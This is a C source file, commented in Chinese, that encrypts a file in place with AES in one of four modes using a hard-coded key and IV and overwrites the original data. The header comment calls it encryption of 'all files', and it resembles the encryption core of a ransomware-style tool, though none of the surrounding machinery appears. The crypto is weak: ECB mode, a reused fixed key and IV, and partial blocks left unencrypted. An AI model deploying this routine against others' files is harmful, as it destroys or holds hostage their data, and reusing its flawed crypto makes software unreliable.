#include "info.h"
#include <stdio.h>
#include <stdlib.h>
#include <openssl/aes.h>
#pragma warning(disable : 4996)

/**
* 加密所有文件
* @param
* @return
**/
void encrypt_file(char* file_path, int method) {
	FILE* fp;

	if ((fp = fopen(file_path, "rb+")) == NULL) {
		puts("Fail to open file!");
		exit(0);
	}

	// 获取整个文件大小，单位字节
	int file_length = get_file_size(fp);

	// 指定加密数据大小
	int encrypt_size = file_length;
	if (file_length < 16) {
		encrypt_size = 16;
		file_length = 16;
	}
	else {
		encrypt_size = (file_length / 16) * 16;
	}


	// 为读取文件内容分配内存
	char* dPtr = calloc(file_length, sizeof(char));

	// 读取文件数据
	fread(dPtr, 1, file_length, fp);
	rewind(fp);

	// 打印文件原始数据
	/*printf_buff(dPtr, file_length);*/

	// 加密文件
	int encrypt_size_temp = encrypt_size;
	char* dPtr_temp = dPtr;
	char* dPtr_encrypt = dPtr;
	switch (method)
	{
	case 0:
		encrypt_0_buff(dPtr_temp, dPtr_encrypt, encrypt_size_temp);
		break;
	case 1:
		encrypt_1_buff(dPtr_temp, dPtr_encrypt, encrypt_size_temp);
		break;
	case 2:
		encrypt_2_buff(dPtr_temp, dPtr_encrypt, encrypt_size_temp);
		break;
	case 3:
		encrypt_3_buff(dPtr_temp, dPtr_encrypt, encrypt_size_temp);
		break;
	default:
		encrypt_0_buff(dPtr_temp, dPtr_encrypt, encrypt_size_temp);
	}

	// 写入原文件
	fwrite(dPtr, 1, file_length, fp);
	rewind(fp);

	// 文件关闭
	fclose(fp);

	// 内存释放
	free(dPtr);
}

/**
* AES ECB方式加密
* @param
* @param
* @param
* @return
**/
void encrypt_0_buff(char* dPtr_temp, char* dPtr_encrypt, int encrypt_size) {
	// 生成128位密钥
	AES_KEY aes_encrypt_key;
	unsigned char* key = str2hex("8cc72b05705d5c46f412af8cbed55aad");
	AES_set_encrypt_key(key, 128, &aes_encrypt_key);
	while (encrypt_size) {
		AES_ecb_encrypt(dPtr_temp, dPtr_encrypt, &aes_encrypt_key, AES_ENCRYPT);
		encrypt_size -= AES_BLOCK_SIZE;
		dPtr_temp += AES_BLOCK_SIZE;
		dPtr_encrypt += AES_BLOCK_SIZE;
	}

	// 释放内存
	free(key);
}

/**
* AES CBC方式加密
* @param
* @param
* @param
* @return
**/
void encrypt_1_buff(char* dPtr_temp, char* dPtr_encrypt, int encrypt_size) {
	// 生成128位密钥
	AES_KEY aes_encrypt_key;
	unsigned char* key = str2hex("8cc72b05705d5c46f412af8cbed55aad");
	AES_set_encrypt_key(key, 128, &aes_encrypt_key);

	// 生成iv初始向量
	unsigned char* iv = str2hex("667b02a85c61c786def4521b060265e8");

	// 加密数据
	AES_cbc_encrypt(dPtr_temp, dPtr_encrypt, encrypt_size, &aes_encrypt_key, iv, AES_ENCRYPT);
	
	// 内存释放
	free(key);
	free(iv);
}

/**
* AES OFB方式加密
* @param
* @param
* @param
* @return
**/
void encrypt_2_buff(char* dPtr_temp, char* dPtr_encrypt, int encrypt_size) {
	// 生成128位密钥
	AES_KEY aes_encrypt_key;
	unsigned char* key = str2hex("8cc72b05705d5c46f412af8cbed55aad");
	AES_set_encrypt_key(key, 128, &aes_encrypt_key);

	// 生成iv初始向量
	unsigned char* iv = str2hex("667b02a85c61c786def4521b060265e8");

	// 定义num变量为AES_cfb128_encrypt函数
	int encrypt_num = 0;

	// 加密数据
	AES_ofb128_encrypt(dPtr_temp, dPtr_encrypt, encrypt_size, &aes_encrypt_key, iv, &encrypt_num);

	// 释放内存
	free(key);
	free(iv);
}

/**
* AES CFB方式加密
* @param
* @param
* @param
* @return
**/
void encrypt_3_buff(char* dPtr_temp, char* dPtr_encrypt, int encrypt_size) {
	// 生成128位密钥
	AES_KEY aes_encrypt_key;
	unsigned char* key = str2hex("8cc72b05705d5c46f412af8cbed55aad");
	AES_set_encrypt_key(key, 128, &aes_encrypt_key);

	// 生成iv初始向量
	unsigned char* iv = str2hex("667b02a85c61c786def4521b060265e8");

	// 定义num变量为AES_cfb128_encrypt函数
	int encrypt_num = 0;

	// 加密数据
	AES_cfb128_encrypt(dPtr_temp, dPtr_encrypt, encrypt_size, &aes_encrypt_key, iv, &encrypt_num, AES_ENCRYPT);

	// 释放内存
	free(key);
	free(iv);
}
